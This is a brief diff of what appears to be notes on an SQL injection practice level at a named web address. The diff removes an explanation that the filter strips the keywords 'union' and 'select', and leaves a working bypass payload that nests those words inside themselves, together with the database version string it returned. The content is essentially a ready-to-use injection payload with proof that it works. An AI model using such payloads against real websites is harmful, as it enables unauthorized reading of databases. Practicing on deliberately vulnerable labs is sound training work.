@@ -1,7 +1,4 @@
 http://root0x00.altervista.org/sqli/level.php
 
-* replaced
-  'union' or 'select' ->> ''
-
 ?id=0' ununionion selselectect 1,2,3,4,version() %23
 >> 5.6.33-log
